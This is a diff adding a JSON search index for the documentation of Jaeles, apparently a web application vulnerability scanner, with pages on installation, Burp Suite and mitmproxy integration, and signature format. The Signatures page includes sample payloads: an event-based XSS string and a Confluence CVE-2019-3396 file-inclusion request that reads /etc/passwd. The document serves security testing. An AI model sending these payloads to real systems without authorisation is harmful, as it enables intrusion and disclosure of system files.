@@ -1,0 +1,92 @@
+[
+{
+	"uri": "/introduction/",
+	"title": "Introduction",
+	"tags": [],
+	"description": "",
+	"content": " Custom your Injection point and scan exactly request that you consider potential but also support automatic scan design by you.\nDocumentation Check out Installation Guide to install.\nCheck out Usage Guide to get started.\nScreenshots Signatures \u0026amp; Plugins Easy to extend and customize Signatures.\nSending from Burp Suite.\nContribute Note that this is an alpha version so it may not stable yet and contain bunch of ugly cod and bug that I will refactor later.\nCredits React UI source can be found from this repo.\nAwesome artworks by Freepik at flaticon.com.\nContact @j3ssiejjj\n"
+},
+{
+	"uri": "/plugins/burp-integration/",
+	"title": "Burp Integration",
+	"tags": [],
+	"description": "",
+	"content": "Get input from Burp\nBurp -\u0026gt; Extender -\u0026gt; Add Jaeles-burp.py as python extensions.\nGet your JWT from this API and fill it into Jaeles Tab in Burp then you\u0026rsquo;re good to go. Click save button if you want to store JWT persistence.\nDefault log will be store in ~/.jaeles-burp/config.json\n "
+},
+{
+	"uri": "/installation/",
+	"title": "Installation",
+	"tags": [],
+	"description": "",
+	"content": " Jaeles installation Video Guide\nCore Install git clone https://github.com/j3ssie/Jaeles cd Jaeles ./install.sh source jenv/bin/activate  Run Django Application python3 manage.py runserver  Then open your browser at http://127.0.0.1:8000. You gonna need create an user for Web UI access.\npython3 manage.py createsuperuser  After create new user you gonna need default data to get stared. Run default data setup to gen some default data for you.\npython3 scripts/reset.py  Running background task using redis This is not mandatory but it allow to Jaeles to run background task automatically.\nMake sure you have Redis installed or check this install guide if you\u0026rsquo;re on Mac or *nix.\nRun redis server redis-server  Run celery Navigate to Jaeles/jaeles/ then run\ncelery -A jaeles worker -l info  Check out install page on Wiki for more detail.\n"
+},
+{
+	"uri": "/usage/",
+	"title": "Usage",
+	"tags": [],
+	"description": "",
+	"content": " Using with Burp Suite Go to Burp Extender Tab and add python extension from Jaeles/plugins/Jaeles-burp.py to your Burp.\nGet your JWT from this API and fill it into Jaeles Tab in Burp then you\u0026rsquo;re good to go.\nImport Request with proxy mode Navigate to Jaeles/jaeles/extensions then run\nmitmdump -q -p 8779 -s jaeles-mitmproxy.py  Import request from command line\ncurl \u0026quot;http://example.com/listproducts.php?cat=1\u0026quot; --proxy http://\u0026lt;your_bind_interface\u0026gt;:8779 -H 'X-Jaeles: \u0026lt;your_token\u0026gt;'  or just run this if you bind from localhost\ncurl \u0026quot;http://example.com/listproducts.php?cat=1\u0026quot; --proxy http://127.0.0.1:8779  "
+},
+{
+	"uri": "/plugins/",
+	"title": "Plugins",
+	"tags": [],
+	"description": "",
+	"content": " Burp Integration as extension. Persistent Burpcollaborator. "
+},
+{
+	"uri": "/signatures/create-your-first/",
+	"title": "Create Your First",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "/signatures/understand-signatures/",
+	"title": "Understand Signatures",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "/plugins/persistent-burpcollaborator/",
+	"title": "Persistent Burpcollaborator",
+	"tags": [],
+	"description": "",
+	"content": " Get Collaborator Secret token Route traffic through proxy\nBurp -\u0026gt; Project Options -\u0026gt; Connections -\u0026gt; Upstream Proxy Server -\u0026gt; then run command below\nmitmdump -q -p 8667 -s burpcollaborator-oob.py  Get burpcollaborator secret\nBurp -\u0026gt; Project Options -\u0026gt; Connections -\u0026gt; Mics -\u0026gt; -\u0026gt; Burp Collaborator Server.\nCheck on Poll over unencrypted HTTP and press run health check many time you want to get secret key\nDefault log will be store in ./collaborator.json\n "
+},
+{
+	"uri": "/signatures/",
+	"title": "Signatures",
+	"tags": [],
+	"description": "",
+	"content": " Easy to extend signatures\nNormal Signature \u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;PayloadConfigList\u0026gt; \u0026lt;PayloadConfig\u0026gt; \u0026lt;AttackPayload\u0026gt; \u0026lt;Id\u0026gt;XSS_01_1\u0026lt;/Id\u0026gt; \u0026lt;PayloadName\u0026gt;XSS event base\u0026lt;/PayloadName\u0026gt; \u0026lt;PayloadType\u0026gt;XSS\u0026lt;/PayloadType\u0026gt; \u0026lt;OS\u0026gt;General\u0026lt;/OS\u0026gt; \u0026lt;Technology\u0026gt;General\u0026lt;/Technology\u0026gt; \u0026lt;Vulnerability\u0026gt;Cross Site Scripting (XSS)\u0026lt;/Vulnerability\u0026gt; \u0026lt;Description\u0026gt;Event based\u0026lt;/Description\u0026gt; \u0026lt;Risk\u0026gt;High\u0026lt;/Risk\u0026gt; \u0026lt;PayloadString\u0026gt; \u0026lt;![CDATA[%ORIGINAL%'\u0026quot;\u0026gt;\u0026lt;svg/onload=alert(%RANNUM%)\u0026gt;]]\u0026gt; \u0026lt;/PayloadString\u0026gt; \u0026lt;/AttackPayload\u0026gt; \u0026lt;AnalyzeList\u0026gt; \u0026lt;Analyze type=\u0026quot;string\u0026quot;\u0026gt; \u0026lt;AnalyzeString\u0026gt; \u0026lt;![CDATA[\u0026lt;svg/onload=alert(\u0026gt;]]\u0026gt; \u0026lt;/AnalyzeString\u0026gt; \u0026lt;AnalyzeComponent\u0026gt;General\u0026lt;/AnalyzeComponent\u0026gt; \u0026lt;Confidence\u0026gt;Tentative\u0026lt;/Confidence\u0026gt; \u0026lt;/Analyze\u0026gt; \u0026lt;/AnalyzeList\u0026gt; \u0026lt;AnalyzeList\u0026gt; \u0026lt;Analyze type=\u0026quot;regex\u0026quot;\u0026gt; \u0026lt;AnalyzeString\u0026gt; \u0026lt;![CDATA[\\\u0026lt;svg\\/onload\\=alert\\(.*]]\u0026gt; \u0026lt;/AnalyzeString\u0026gt; \u0026lt;AnalyzeComponent\u0026gt;General\u0026lt;/AnalyzeComponent\u0026gt; \u0026lt;Confidence\u0026gt;Tentative\u0026lt;/Confidence\u0026gt; \u0026lt;/Analyze\u0026gt; \u0026lt;/AnalyzeList\u0026gt; \u0026lt;/PayloadConfig\u0026gt; \u0026lt;PayloadConfig\u0026gt; ... \u0026lt;/PayloadConfig\u0026gt; \u0026lt;/PayloadConfigList\u0026gt;  Special Signature \u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;PayloadConfigList\u0026gt; \u0026lt;PayloadConfig\u0026gt; \u0026lt;AttackPayload\u0026gt; \u0026lt;Id\u0026gt;CVE_01_1\u0026lt;/Id\u0026gt; \u0026lt;PayloadName\u0026gt;Confluence CVE-2019-3396\u0026lt;/PayloadName\u0026gt; \u0026lt;PayloadType\u0026gt;CVE\u0026lt;/PayloadType\u0026gt; \u0026lt;OS\u0026gt;General\u0026lt;/OS\u0026gt; \u0026lt;Technology\u0026gt;Jira Confluence\u0026lt;/Technology\u0026gt; \u0026lt;Vulnerability\u0026gt;File Inclusion\u0026lt;/Vulnerability\u0026gt; \u0026lt;Description\u0026gt;Confluence CVE-2019-3396\u0026lt;/Description\u0026gt; \u0026lt;Risk\u0026gt;Critical\u0026lt;/Risk\u0026gt; \u0026lt;PayloadString\u0026gt; \u0026lt;![CDATA[%HEADER@Content-Type%|application/xml]]\u0026gt; \u0026lt;/PayloadString\u0026gt; \u0026lt;PayloadString\u0026gt; \u0026lt;![CDATA[%BODY%|{\u0026quot;contentId\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;macro\u0026quot;:{\u0026quot;name\u0026quot;:\u0026quot;widget\u0026quot;,\u0026quot;params\u0026quot;:{\u0026quot;url\u0026quot;:\u0026quot;https://www.viddler.com/v/test\u0026quot;,\u0026quot;width\u0026quot;:\u0026quot;1000\u0026quot;,\u0026quot;height\u0026quot;:\u0026quot;1000\u0026quot;,\u0026quot;_template\u0026quot;:\u0026quot;file:///etc/passwd\u0026quot;},\u0026quot;body\u0026quot;:\u0026quot;\u0026quot;}}]]\u0026gt; \u0026lt;/PayloadString\u0026gt; \u0026lt;/AttackPayload\u0026gt; \u0026lt;AnalyzeList\u0026gt; \u0026lt;Analyze type=\u0026quot;string\u0026quot;\u0026gt; \u0026lt;AnalyzeString\u0026gt; \u0026lt;![CDATA[root:x:0:0:root]]\u0026gt; \u0026lt;/AnalyzeString\u0026gt; \u0026lt;AnalyzeComponent\u0026gt;General\u0026lt;/AnalyzeComponent\u0026gt; \u0026lt;Confidence\u0026gt;Tentative\u0026lt;/Confidence\u0026gt; \u0026lt;/Analyze\u0026gt; \u0026lt;/AnalyzeList\u0026gt; \u0026lt;AnalyzeList\u0026gt; \u0026lt;Analyze type=\u0026quot;string\u0026quot;\u0026gt; \u0026lt;AnalyzeString\u0026gt; \u0026lt;![CDATA[/bin/bash]]\u0026gt; \u0026lt;/AnalyzeString\u0026gt; \u0026lt;AnalyzeComponent\u0026gt;General\u0026lt;/AnalyzeComponent\u0026gt; \u0026lt;Confidence\u0026gt;Tentative\u0026lt;/Confidence\u0026gt; \u0026lt;/Analyze\u0026gt; \u0026lt;/AnalyzeList\u0026gt; \u0026lt;/PayloadConfig\u0026gt; \u0026lt;/PayloadConfigList\u0026gt;  "
+},
+{
+	"uri": "/core/",
+	"title": "Core",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "/",
+	"title": "Home",
+	"tags": [],
+	"description": "",
+	"content": "Web Application Scanner Framework for Expert This is just documentation full release will comming soon!\n "
+},
+{
+	"uri": "/categories/",
+	"title": "Categories",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "/tags/",
+	"title": "Tags",
+	"tags": [],
+	"description": "",
+	"content": ""
+}]
